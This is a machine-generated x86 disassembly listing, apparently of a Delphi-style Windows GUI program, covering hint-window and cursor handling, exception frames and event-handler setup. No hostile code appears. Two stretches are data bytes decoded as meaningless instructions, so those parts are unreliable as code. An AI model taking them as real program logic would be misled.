test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_463db0
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_463bb8
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_443750
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_464048
jmp r-xdata
sub_463d34
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_463bfc
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_464048
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_463d6c
jmp r-xdata
sub_463d6c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_449088
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_448d84
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_448d84
push eax
call ShowWindow
sub_463db0
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_463d6c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_461a50
mov eax ebx
call sub_463bfc
sub_463de8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_463f2a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41f4d4
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407e2c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_463efb
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41f58c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463f02
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402714
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_463dd8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_463dd8
mov [ ebp - 0x4 ] eax
sub_463f02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_463f3c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403344
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_40328c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_463f9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_464036
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46403d
lea eax [ ebp - 0x8 ]
call sub_404094
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404184
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41e070
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c8a0
mov ebx eax
inc ebx
sub_464048
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a00
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4643ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_463db0
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_463bb8
jmp r-xdata
call sub_45a0f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4643d5
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404ad0
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_440dfc
call sub_4618c8
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_463de8
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_460bfc
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_441ef0
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_442094
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_461890
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43f61c
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_40412c
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_443750
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_463f3c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_442068
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_442068
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_4426f0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_4619dc
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_463f9c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_463bb8
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_463bb8
jmp r-xdata
sub_4643dc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_4040e8
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_4040e8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46443c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_464468
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_443750
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_443750
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44ef30
sub_4644f8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_464520
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_4645c4
add [ eax ] eax
add [ eax ] al
pop esp
sub eax 0xec500049
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_464627
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46462e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_459ea4
mov eax sub_45a124
call sub_413ea0
mov eax [ rw-data ]
push eax
call CloseHandle
sub_4649dd
pushfd
inc ebp
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000f ] al
outsb
push ebx
je r-xdata
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ ebp + ecx * 2 + 0x46 ] al
add [ esp + edx * 2 ] cl
dec ebp
jne r-xdata
imul ebp [ esi + 0x67 ] 0x6e616843
mov eax eax
push esp
dec edx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x464a ] bl
add [ eax ] al
stc
jmp [ edi + ecx * 4 + 0x5 ]
je r-xdata
jmp r-xdata
inc ebx
popad
jae r-xdata
pop esi
pop ebx
retn
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 + r--data ] al
add [ eax ] al
add al 0x2c
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
mov esp 0x9800464e
dec edx
inc ecx
add [ eax ] ch
mov eax [ 0x49b40041 ]
inc ecx
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
inc eax
add [ eax + 0x700464a ] bl
or al 0x54
dec ebp
jne r-xdata
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
je r-xdata
cmp [ eax + 0x32 ] 0x0
inc ebx
popad
jae r-xdata
jb r-xdata
add [ eax ] al
add [ ebx - 0x3974f33c ] al
dec edx
inc esi
add [ eax ] al
sub eax 0x20041
or [ ecx + 0x70 ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
fmul [ ebx + 0x53ff3c43 ]
cmp [ ebx - 0x3d ] bl
mov eax eax
je r-xdata
pop ebx
retn
add [ eax ] al
nop
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419db0
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
test bl bl
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_464d20
mov eax esi
add esp 0xc
call sub_4036c0
pop [ fs : 0x0 ]
sub_464b58
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
mov edx [ rw-data ]
call sub_4034d0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov ecx esi
mov edx edi
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_464b88
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_464ba8
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c13c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464c12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_44f068
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403344
retn
mov ebx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464c94
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_464cbc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_464d20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_424d1c
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_424cb4
sub_464d44
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ rw-data ]
xor edx edx
mov eax ebx
call sub_419db0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_424b14
mov [ ebx + 0x30 ] eax
mov eax [ esi ]
mov [ eax + 0xc4 ] ebx
mov [ eax + 0xc0 ] sub_464ff8
mov eax [ esi ]
mov [ eax + 0xcc ] ebx
mov [ eax + 0xc8 ] sub_465074
mov eax [ esi ]
mov [ eax + 0x114 ] ebx
mov [ eax + 0x110 ] sub_4650f0
mov eax [ esi ]
mov [ eax + 0x10c ] ebx
mov [ eax + 0x108 ] sub_465164
mov eax [ esi ]
mov [ eax + 0xd4 ] ebx
mov [ eax + 0xd0 ] sub_4651d8
mov eax [ esi ]
mov [ eax + 0xf4 ] ebx
mov [ eax + 0xf0 ] sub_465294
mov eax [ esi ]
mov [ eax + 0xfc ] ebx
mov [ eax + 0xf8 ] sub_465330
mov eax [ esi ]
mov [ eax + 0x104 ] ebx
mov [ eax + 0x100 ] sub_4653a4
mov eax [ esi ]
mov [ eax + 0xdc ] ebx
mov [ eax + 0xd8 ] sub_465420
mov eax [ esi ]
mov [ eax + 0x11c ] ebx
mov [ eax + 0x118 ] sub_46549c
mov eax [ esi ]
mov [ eax + 0x124 ] ebx
mov [ eax + 0x120 ] sub_465510
mov eax [ esi ]
mov [ eax + 0x134 ] ebx
mov [ eax + 0x130 ] sub_465600
mov eax [ esi ]
mov [ eax + 0x12c ] ebx
mov [ eax + 0x128 ] sub_465584
mov eax [ esi ]
mov [ eax + 0x13c ] ebx
mov [ eax + 0x138 ] sub_465680
mov eax [ esi ]
mov [ eax + 0xe4 ] ebx
mov [ eax + 0xe0 ] sub_465770
mov eax [ esi ]
mov [ eax + 0xec ] ebx
mov [ eax + 0xe8 ] sub_4657e4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_464ebc
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc0 ] ecx
mov [ edx + 0xc4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc8 ] ecx
mov [ edx + 0xcc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x110 ] ecx
mov [ edx + 0x114 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x108 ] ecx
mov [ edx + 0x10c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd0 ] ecx
mov [ edx + 0xd4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf0 ] ecx
mov [ edx + 0xf4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf8 ] ecx
mov [ edx + 0xfc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x100 ] ecx
mov [ edx + 0x104 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd8 ] ecx
mov [ edx + 0xdc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x118 ] ecx
mov [ edx + 0x11c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x120 ] ecx
mov [ edx + 0x124 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x130 ] ecx
mov [ edx + 0x134 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x128 ] ecx
mov [ edx + 0x12c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x138 ] ecx
mov [ edx + 0x13c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xe0 ] ecx
mov [ edx + 0xe4 ] ecx
mov eax [ eax ]
xor edx edx
mov [ eax + 0xe8 ] edx
mov [ eax + 0xec ] edx
mov eax [ esi + 0x30 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419dfc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_464ff8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_465064
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46506b
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov ecx edi
mov edx esi
call sub_464b08
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465074
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_4650e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4650e7
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov ecx edi
mov edx esi
call sub_464b1c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4650f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_465157
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46515e
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov edx esi
call sub_464b30
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465164
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_4651cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4651d2
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov edx esi
call sub_464b44
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4651d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push sub_465287
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46528e
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4034d0
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov [ ebp - 0x9 ] 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
